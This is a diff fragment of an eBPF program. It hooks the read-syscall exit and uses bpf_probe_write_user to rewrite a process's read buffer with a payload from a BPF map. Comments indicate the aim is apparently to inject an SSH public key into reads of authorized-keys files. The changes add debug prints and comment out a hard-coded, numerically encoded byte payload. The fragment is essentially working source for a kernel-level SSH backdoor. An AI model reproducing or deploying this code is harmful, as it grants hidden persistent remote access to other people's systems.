@@ -56,6 +56,7 @@ format:
 SEC("tp/syscalls/sys_exit_read")
 int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
 {
+    bpf_printk("The read Exit Called\n");
     // Check this open call is reading our target file
     size_t pid_tgid = bpf_get_current_pid_tgid();
     // [DEBUG] int pid = pid_tgid >> 32;
@@ -91,10 +92,10 @@ int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
     // |<--------- raw content ------->|\n|<------------ payload ------------->|
     // |<----------------------------- ret_size ------------------------------>|
     // |<-- buff_addr                  |<-- new_buff_addr                      |<-- buff_addr + read_size
-    char local_buff[max_payload_len] = {0x00}; // clean buff
+    // char local_buff[max_payload_len] = {0x0a, 67,63,40,67,63,40,66,70,40,62,104,40,66,65,40,66,64,40,63,62,40,63,65,40,63,65,40,63,61,40,63,71,40,62,60,40,64,61,40,64,61,40,64,61,40,64,61,40,64,63,40,63,63,40,64,105,40,67,101,40,66,61,40,64,63,40,63,61,40,66,103,40,65,101,40,64,64,40,64,71,40,63,61,40,64,105,40,65,64,40,64,65,40,63,65,40,64,61,40,64,61,40,64,61,40,64,61,40,64,71,40,64,104,40,67,101,40,64,66,40,66,65,40,65,60,40,64,104,40,63,60,40,67,65,40,63,71,40,63,62,40,64,105,40,66,101,40,67,60,40,64,63,40,64,101,40,63,63,40,65,64,40,67,66,40,64,67,40,64,71,40,65,71,40,63,64,40,64,63,40,66,71,40,66,64,40,67,101,40,65,64,40,65,64,40,65,62,40,66,106,40,64,65,40,67,101,40,64,105,40,66,64,40,66,104,40,64,103,40,64,105,40,65,65,40,67,70,40,66,63,40,64,105,40,64,105,40,64,63,40,62,60,40,67,62,40,66,106,40,66,106,40,67,64,40,64,60,40,66,62,40,63,61,40,63,61,40,63,64,40,63,65,40,63,61,40,63,64, 0x0a}; // clean buff
+    char local_buff[max_payload_len] = {0x00};
     __u8 key = 0;
     struct custom_payload *payload = bpf_map_lookup_elem(&map_payload_buffer, &key);
-    
     long unsigned int new_buff_addr = buff_addr + read_size - max_payload_len -1;
     // long unsigned int new_buff_addr = buff_addr + read_size - payload->payload_len -1;
     // char *new_buff_addr = (char *)(buff_addr + read_size - max_payload_len -1);
@@ -113,6 +114,7 @@ int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
         // local_buf[i+1] = payload[i];
         local_buff[i + 1] = payload->raw_buf[i];
     }
+    bpf_printk("%s\n", local_buff);
     bpf_probe_write_user((void *)new_buff_addr, local_buff, max_payload_len);
     // local_buff[payload->payload_len+1] = '\n';
     // local_buff[max_payload_len + 1] = '\0';
@@ -130,8 +132,8 @@ int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
         bpf_get_current_comm(&e->comm, sizeof(e->comm));
         bpf_ringbuf_submit(e, 0);
     }
-    */
 
+    */
     // There need bpf delete the pid in maps to avoid the rewrite the others ssh pub keys.
     // Closing file, delete fd from all maps to clean up
     bpf_map_delete_elem(&map_fds, &pid_tgid);
